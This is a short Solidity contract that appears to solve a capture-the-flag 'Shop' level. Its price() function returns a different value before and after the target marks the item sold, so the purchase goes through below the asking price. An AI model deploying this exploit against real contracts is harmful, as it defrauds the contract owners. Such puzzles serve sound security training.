// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract ShopSolver {

    Target shop;

    function solve(address target) external {
        shop = Target(target);
        shop.buy();
    }

    function price() public view returns (uint) {
        if (shop.isSold())
            { return 0;}
        else
            {return 100;}
    }
}

interface Target {
    function buy() external;
    function isSold() external view returns (bool);
}
